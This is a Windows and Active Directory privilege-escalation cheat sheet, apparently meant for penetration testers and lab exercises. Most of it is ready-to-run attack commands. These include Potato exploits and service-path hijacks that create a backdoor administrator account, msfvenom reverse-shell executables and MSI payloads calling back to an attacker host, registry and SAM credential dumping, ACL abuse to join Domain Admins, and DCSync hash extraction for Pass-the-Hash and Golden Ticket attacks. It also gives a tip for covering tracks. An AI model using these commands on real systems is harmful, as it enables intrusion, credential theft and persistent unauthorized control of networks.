Windows Privilege Escalation - Cheat Sheet

Escalate from a low-privilege shell to SYSTEM or Domain Admin.
Run automated tools first — they surface the vector.
Replace the placeholders (<...>) with your own values.


════════════════════════════════════════════════════════════════════
PART 1 — LOCAL PRIVILEGE ESCALATION
════════════════════════════════════════════════════════════════════

── Situational Awareness ────────────────────────────────────────────

First thing after landing a shell — understand your context.

    whoami                               # current user
    whoami /all                          # user, groups, and ALL privileges
    whoami /priv                         # privileges only — the key thing to check
    systeminfo                           # OS build, hotfixes, domain membership
    net localgroup administrators        # who has local admin?
    net user                             # all local accounts
    hostname
    ipconfig /all

Key: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege in
whoami /priv means Potato attacks will almost certainly work.


── Automated Enumeration ────────────────────────────────────────────

Transfer tools from Kali:

    # Serve files on Kali:
    python3 -m http.server 80

    # Download on victim (CMD):
    certutil -urlcache -f http://<kali-ip>/winPEASx64.exe winPEAS.exe

    # Download on victim (PowerShell):
    iwr http://<kali-ip>/PowerUp.ps1 -o PowerUp.ps1

    # Via evil-winrm:
    upload /path/to/winPEASx64.exe

Run automated checks:

winPEAS — most comprehensive, color-coded (yellow = interesting, red = high value):

    .\winPEASx64.exe

PowerUp — service and registry focused:

    powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

Seatbelt — detailed system audit:

    .\Seatbelt.exe -group=all

PrivescCheck — no dependencies:

    powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"


── Token Privileges (SeImpersonatePrivilege) ────────────────────────

Check first:

    whoami /priv
    # Look for: SeImpersonatePrivilege  or  SeAssignPrimaryTokenPrivilege

PrintSpoofer — Windows 10 / Server 2016 and later:

    .\PrintSpoofer64.exe -i -c cmd
    .\PrintSpoofer64.exe -c "net user hacker P@ss123! /add && net localgroup administrators hacker /add"

GodPotato — most universal (Windows 2012–2022, Windows 8–11):

    .\GodPotato-NET4.exe -cmd "whoami"
    .\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"

JuicyPotato — older systems (Server 2012/2016, Win 7/8/10 pre-1809):

    .\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

    JuicyPotato needs a CLSID for the specific OS:
    github.com/ohpe/juicy-potato/tree/master/CLSID

SeBackupPrivilege — dump SAM without admin:

    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive

    # On Kali:
    impacket-secretsdump -sam sam.hive -system system.hive LOCAL

    NT hashes → use for Pass-the-Hash (see PtH cheatsheet)


── Service Exploits ─────────────────────────────────────────────────

-- Unquoted Service Paths --

If a service path contains spaces and is unquoted, Windows tries to
run each space-delimited segment as a binary.

Find them:

    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "c:\windows" | findstr /v """"

    # PowerUp:
    powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-UnquotedService"

Exploit — place payload at the ambiguous path, then restart:

    # If path is: C:\Program Files\My App\service.exe
    # → try: C:\Program.exe  or  C:\Program Files\My.exe

    sc stop <service-name>
    sc start <service-name>

    # Or let PowerUp do it:
    powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Write-ServiceBinary -ServiceName '<svc>' -UserName hacker -Password P@ss123!"


-- Weak Service Binary Permissions --

    # Check write permissions on the binary:
    icacls "C:\path\to\service.exe"
    # BUILTIN\Users:(F) or (W) = writable

    # PowerUp:
    powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableServiceFile"

Exploit:

    # On Kali:
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=<port> -f exe -o evil.exe

    # On victim:
    copy evil.exe "C:\path\to\service.exe"
    sc stop <service-name>
    sc start <service-name>


-- Weak Service ACLs (Modify binpath) --

    # Find services you can reconfigure:
    .\accesschk.exe /accepteula -uwcqv <username> *

    # PowerUp:
    powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableService"

Exploit — two restart cycles (each sc start runs one command):

    sc config <service-name> binpath= "cmd.exe /c net user hacker P@ss123! /add"
    sc stop <service-name>
    sc start <service-name>

    sc config <service-name> binpath= "cmd.exe /c net localgroup administrators hacker /add"
    sc stop <service-name>
    sc start <service-name>

    Note: space after binpath= is required.


── AlwaysInstallElevated ────────────────────────────────────────────

Both registry keys must be 1 for this to be exploitable:

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    # PowerUp check:
    powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-RegistryAlwaysInstallElevated"

If both return 0x1:

    # On Kali — create MSI payload:
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=<port> -f msi -o evil.msi

    # On victim — installs as SYSTEM:
    msiexec /quiet /qn /i evil.msi


── Stored Credentials ───────────────────────────────────────────────

AutoLogon credentials in registry:

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    # Look for: DefaultUserName, DefaultPassword, DefaultDomainName

Saved credentials (cmdkey):

    cmdkey /list
    runas /savecred /user:<domain>\<username> cmd.exe

Registry password hunt:

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s

Unattended install files (passwords often base64-encoded):

    type C:\Windows\Panther\Unattend.xml
    type C:\Windows\Panther\Unattended.xml
    type C:\Windows\System32\sysprep\sysprep.xml
    type C:\Windows\System32\sysprep.inf

    # Decode on Kali:
    echo <base64string> | base64 -d


── Scheduled Tasks ──────────────────────────────────────────────────

    # List tasks and their run-as context:
    schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run"

    # Check permissions on the task binary:
    icacls "C:\path\to\task\binary.exe"
    # BUILTIN\Users:(W) or (F) = writable → replace with payload

    # PowerUp:
    powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableScheduledTaskFile"

Tasks triggered on login or system start are faster to exploit than
time-based triggers. Check "Schedule Type" and "Next Run Time".


── Kernel Exploits (Last Resort) ────────────────────────────────────

    # Dump system info on victim:
    systeminfo > sysinfo.txt

    # On Kali — check against known CVEs:
    python3 wesng.py --update
    python3 wesng.py sysinfo.txt

Notable CVEs to check for:
    CVE-2021-1675 / 34527  PrintNightmare  — spooler → SYSTEM (W10/Server 2019)
    CVE-2021-36934         HiveNightmare   — read SAM as low-priv (W10 21H1+)
    CVE-2020-0796          SMBGhost        — local RCE (W10 1903/1909)
    MS16-032                               — secondary logon → SYSTEM (W7–W10)

WES-NG: github.com/bitsadmin/wesng
Watson / SharpUp can also check directly on the victim.


════════════════════════════════════════════════════════════════════
PART 2 — ACTIVE DIRECTORY ESCALATION
════════════════════════════════════════════════════════════════════

── BloodHound — AD Path Mapping ─────────────────────────────────────

Run as soon as you have any domain credential.

From Kali (no Windows foothold needed):

    bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc-fqdn> -c all --zip

From Windows foothold (SharpHound):

    .\SharpHound.exe -c all --zipfilename bloodhound.zip
    # Transfer zip to Kali → drag-drop into BloodHound GUI

Key built-in queries:
    Shortest Paths to Domain Admins
    Find Principals with DCSync Rights
    Find Computers where Domain Admins are Logged On
    Kerberoastable Users with Paths to DA


── ACL Abuse ────────────────────────────────────────────────────────

BloodHound surfaces the exact ACL edge. Common ones:

GenericAll on a user → force password reset:

    net rpc password "<target-user>" "NewPass123!" -U "<domain>/<your-user>%<your-pass>" -S <dc-ip>

    # PowerView:
    Set-DomainUserPassword -Identity <target-user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

GenericAll on a group → add yourself:

    net rpc group addmem "Domain Admins" "<your-user>" -U "<domain>/<your-user>%<your-pass>" -S <dc-ip>

    # PowerView:
    Add-DomainGroupMember -Identity 'Domain Admins' -Members '<your-user>'

WriteDACL on an object → grant yourself GenericAll:

    # PowerView:
    Add-DomainObjectAcl -TargetIdentity "<target>" -PrincipalIdentity "<your-user>" -Rights All

ACL changes are logged. Revert if stealth matters: Remove-DomainObjectAcl


── DCSync ───────────────────────────────────────────────────────────

Dump all domain hashes from the DC without touching LSASS directly.
Requires: Domain Admin, or Replicating Directory Changes rights.

From Kali (Impacket):

    # With plaintext password:
    impacket-secretsdump <domain>/<user>:<pass>@<dc-ip>

    # With NT hash:
    impacket-secretsdump <domain>/<user>@<dc-ip> -hashes :<NT-hash>

Output:
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NT-hash>:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT-hash>:::

Administrator NT hash → Pass-the-Hash to any domain machine (PtH cheatsheet).
krbtgt hash → Golden Ticket attack.


════════════════════════════════════════════════════════════════════
RECOMMENDED WORKFLOW
════════════════════════════════════════════════════════════════════

After landing a shell:
  whoami /priv → SeImpersonate? → Potato attack → SYSTEM
  winPEAS / PowerUp → follow the red/yellow findings
  Service exploits → unquoted path / weak binary / weak ACL
  Registry → AlwaysInstallElevated / cmdkey / AutoLogon
  Scheduled tasks → writable binary → replace
  Kernel exploits → wesng.py → last resort

After SYSTEM (domain-joined):
  bloodhound-python → find shortest path to DA
  ACL abuse → GenericAll / WriteDACL
  DCSync → dump all hashes → Pass-the-Hash / Golden Ticket

Key ideas:
- SeImpersonatePrivilege is the fastest path if you land as a service account.
- winPEAS is the best starting point — run it every time.
- BloodHound is the most powerful domain tool — run it the moment you have creds.
- Service misconfigs are the most common vector in lab environments.
- Unquoted service path + unquoted path + writable location = SYSTEM.
